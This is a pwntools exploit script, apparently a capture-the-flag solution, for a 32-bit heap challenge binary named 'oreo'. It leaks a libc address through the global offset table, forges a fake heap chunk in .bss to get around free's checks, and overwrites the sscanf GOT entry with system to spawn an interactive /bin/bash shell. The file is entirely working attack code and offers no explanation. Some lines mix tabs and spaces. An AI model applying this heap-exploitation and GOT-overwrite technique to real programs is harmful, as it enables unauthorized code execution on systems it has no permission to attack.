# -*- coding=utf-8 -*-
from pwn import *

context.log_level = "debug"

p = process("./oreo_35f118d90a7790bbd1eb6d4549993ef0",stdin=PTY)
e = ELF("./oreo_35f118d90a7790bbd1eb6d4549993ef0")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

def add_rifle(name, descript):
	p.recvuntil("Action:")
	p.sendline("1")
	p.recvuntil("name:")
	p.sendline(name)
	p.recvuntil("description:")
	p.sendline(descript)

def show_rifle():
	p.recvuntil("Action:")
	p.sendline("2")
    	p.readuntil("Name: ")
    	p.readuntil("Name: ")
	return u32(p.read(4))

def leave_message(message):
	p.recvuntil("Action:")
	p.sendline("4")
	p.recvuntil("order: ")
	p.sendline(message)

def order_rifle():
	p.recvuntil("Action:")
	p.sendline("3")
	
if __name__=="__main__":

	sscanf_got = e.got['__isoc99_sscanf']
	sscanf_offset = libc.symbols['__isoc99_sscanf']
	system_offset = libc.symbols['system']
	fake_chunk = 0x804A2A0  #.bss_804A2A0地址的order_num，和.bss_804A2A4的rifle_num

	name = "A"*0x1b +p32(sscanf_got-25)
	add_rifle(name,"test")
	sscanf_addr = show_rifle() #leak the sscanf address
	libc_base = sscanf_addr - sscanf_offset
	system_addr = libc_base + system_offset

	for x in xrange(0x40-1):
	    add_rifle("name","test")

	name = 'B'*(0x1b) + p32(fake_chunk+8)
	add_rifle(name,"test")
	
	message = "\x00"*36 + p32(0x41) #bypass free check
	leave_message(message)

	order_rifle()

	add_rifle('name',p32(sscanf_got))

	leave_message(p32(system_addr))

	p.sendline("/bin/bash\0")

	p.interactive()

